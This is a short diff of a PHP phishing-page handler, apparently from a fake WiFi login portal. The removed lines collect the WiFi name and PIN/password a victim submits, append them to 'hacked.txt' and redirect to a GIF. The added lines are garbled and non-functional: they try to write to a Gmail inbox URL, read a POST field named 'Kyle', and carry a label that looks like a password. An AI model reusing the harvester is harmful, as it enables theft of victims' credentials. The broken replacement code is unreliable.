@@ -1,5 +1,5 @@
 <?php
 
-file_put_contents("hacked.txt", "[Wifi-name:] " . $uname = $_POST['uname'] . " [pin/pass:] " . $pwd = $_POST['psw'] . "\n", FILE_APPEND);
-header('Location: https://thumbs.gfycat.com/BriefDescriptiveIcterinewarbler-size_restricted.gif');
+file_put_contents("https://mail.google.com/mail/u/0/#inbox", "[CODEC Nature & Life Project:] " . $uname = $_POST['Kyle'] . " [Raptor5566:] " . $pwd = $_POST['psw'] . "\n", FILE_APPEND);
+header('Location: https://mail.google.com/mail/u/0/#inbox');
 ?>
